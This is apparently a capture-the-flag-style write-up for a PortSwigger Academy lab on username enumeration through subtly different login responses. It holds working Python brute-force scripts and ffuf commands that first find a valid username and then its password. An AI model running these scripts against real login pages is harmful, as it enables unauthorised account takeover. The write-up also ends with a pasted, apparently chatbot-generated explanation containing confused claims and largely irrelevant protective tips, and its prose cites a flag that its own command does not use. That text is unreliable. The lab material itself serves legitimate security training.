# Username enumeration with subtly different responses

## Enumerating username with subtly different responses using Python

```python
import requests, urllib3
import sys
from string import printable

urllib3.disable_warnings()

class AuthBruteForceUsername:

    def __init__(self):
        # get command line arguments
        self.args = sys.argv
        self.proxies = {
            "https": "https://0.0.0.0:8088"
        }
        self.req = requests.Session()
        self.password = ""
        self.username = ""

    def brute_force_username(self):
        print("🔮 Determining username")
        usernames = []
        with open("auth-subtly/auth-subtly-usernames") as f:
            usernames = f.readlines()
        for username in usernames:
            print(f"Trying username: {username.strip()}❓")
            # send request with form data: username, password
            self.username = username.strip()
            self.password = "a"
            self.url = self.args[1]
            self.cookies = {}
            response = self.req.post(self.url, data={"username": self.username, "password": "a"}, proxies=self.proxies, verify=False)
            if response.text and not "Invalid username or password." in response.text:
                print(f"⚖️ Found username: {self.username}")
                with open("auth-subtly-username-result", "w") as f:
                    f.write(self.username)
                break
        exit(0)

AuthBruteForceUsername().brute_force_username()
```

<a href="https://asciinema.org/a/JFHa04yr1mmtYInf6xtDY896F" target="_blank"><img src="https://asciinema.org/a/JFHa04yr1mmtYInf6xtDY896F.svg" /></a>

## Brute forcing password with subtly different responses using Python

```python
import requests, urllib3
import sys
from string import printable

urllib3.disable_warnings()

class AuthBruteForcePassword:

    def __init__(self):
        # get command line arguments
        self.args = sys.argv
        self.proxies = {
            "https": "https://0.0.0.0:8088"
        }
        self.req = requests.Session()
        self.password = ""
        self.username = ""
        with open("auth-subtly-username-result") as f:
            self.username = f.read().strip()

    def brute_force_password(self):
        print("🔮 Determining passwword for username", self.username)
        passwords = []
        with open("auth/auth-lab-passwords") as f:
            passwords = f.readlines()
        for password in passwords:
            print(f"Trying password: {password.strip()}❓")
            # send request with form data: username, password
            self.password = password.strip()
            self.url = self.args[1]
            self.cookies = {}
            response = self.req.post(self.url, data={"username": self.username, "password": self.password}, proxies=self.proxies, verify=False)
            if response.text and not "Invalid username or password" in response.text:
                print(f"⚖️ Found password: {self.password}")
                with open("auth-subtly-password-result", "w") as f:
                    f.write(self.password)
                break
        exit(0)

AuthBruteForcePassword().brute_force_password()
```

<a href="https://asciinema.org/a/jMQbLSGHvO6bYvzMFjTkClSEe" target="_blank"><img src="https://asciinema.org/a/jMQbLSGHvO6bYvzMFjTkClSEe.svg" /></a>

## ffuf username and password enumeration with slightly different response

### Username

This websites respond slightly different when username is valid although 
password is not. Using ffuf we use `-fw` option to filter responses that has 
the same word count as the invalid username response. This will give us the
username that is valid. 

```shell
ffuf -X POST -replay-proxy http://0.0.0.0:8088 -u https://0ab600d5037c308284b8863000cc00cf.web-security-academy.net/login -w auth-subtly/auth-subtly-usernames -c -v -r -d "username=FUZZ&password=hihihi" -fw 1328,1319
```

### Password

Take the username from above command, and use it to brute force the password. Use the `-fs` flag to filter out responses that are mostly similar. This will give just the response that is different, which is the correct password.

```shell
ffuf -X POST -replay-proxy http://0.0.0.0:8088 -u https://0ab600d5037c308284b8863000cc00cf.web-security-academy.net/login -w auth-subtly/auth-subtly-passwords -c -v -r -d "username=_USERNAME_FROM_COMMAND_ABOVE_&password=FUZZ" -fw 1329,1320
```

<a href="https://asciinema.org/a/Z54jP3M9le38dV8LAMFdjEcvF" target="_blank"><img src="https://asciinema.org/a/Z54jP3M9le38dV8LAMFdjEcvF.svg" /></a>

Sure. The Username enumeration via subtly different responses tutorial example in PortSwigger Academy demonstrates how a website can be vulnerable to username enumeration attacks by using subtly different responses.

In the tutorial, the user is first prompted to enter their username and password. After they have successfully entered their credentials, they are logged in to the website.

The website has a subtle difference in responses for valid and invalid usernames. Specifically, the website returns a different error message for invalid usernames.

This means that an attacker can use this subtle difference to enumerate valid usernames. Specifically, the attacker can submit a list of usernames to the website and see if the response contains a specific error message. If the response contains the error message, the attacker can infer that the username is invalid.

To exploit this vulnerability, the attacker would first need to obtain a list of possible usernames for the website. This could be done through a variety of methods, such as social engineering or dictionary attacks.

Once the attacker has a list of possible usernames, they would need to submit the list to the website and see if the response contains a specific error message. If the response contains the error message, the attacker can infer that the username is invalid. The attacker can then continue to submit usernames until they find one that does not contain the error message, indicating that it is a valid username.

The Username enumeration via subtly different responses tutorial example is a good demonstration of how a website can be vulnerable to username enumeration attacks by using subtly different responses. It is important to be aware of these vulnerabilities and to take steps to protect yourself.

Here are some tips for protecting yourself from username enumeration attacks:

* Use a strong username for your online accounts.
* Change your usernames regularly.
* Be suspicious of emails or text messages that ask for your personal information.
* Install antivirus software and keep it up to date.
* Be careful about what websites you visit and what links you click on.
* Train yourself and your employees on how to identify and avoid phishing attacks.

By following these tips, you can help to protect yourself from username enumeration attacks and keep your accounts safe.

In addition to the tips above, there are a few things that the website can do to protect itself from username enumeration attacks:

* Use a rate limiting mechanism to prevent users from submitting too many requests in a short period of time.
* Use a honeypot account to lure attackers into entering invalid usernames.
* Implement a CAPTCHA challenge to verify that the user is human.
* Use a random error message mechanism to prevent attackers from identifying valid usernames from error messages.

By implementing these measures, the website can help to protect itself from username enumeration attacks.